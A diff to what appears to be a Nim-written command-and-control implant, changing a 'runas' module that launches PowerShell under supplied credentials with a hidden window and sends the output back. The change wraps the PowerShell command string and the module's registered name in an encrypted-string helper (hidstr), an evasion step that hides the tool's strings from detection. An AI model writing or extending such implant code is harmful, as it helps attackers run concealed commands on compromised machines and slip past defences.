@@ -1,6 +1,7 @@
 import std/[json, osproc, os, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc runasExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
@@ -26,7 +27,7 @@ proc runasExecute(taskId: string, params: JsonNode, state: AgentState,
         "-Credential $cred -Wait -WindowStyle Hidden; " &
         "Get-Content $tmp; Remove-Item $tmp"
       let (output, code) = execCmdEx(
-        "powershell -NoProfile -NonInteractive -Command " & quoteShell(psScript),
+        hidstr("powershell -NoProfile -NonInteractive -Command ") & quoteShell(psScript),
         options = {poStdErrToStdOut}, workingDir = state.cwd)
       let status = if code == 0: "success" else: "error"
       return TaskResult(output: output, status: status, completed: true)
@@ -46,4 +47,4 @@ proc runasExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initRunas*() =
-  register("runas", runasExecute)
+  register(hidstr("runas"), runasExecute)
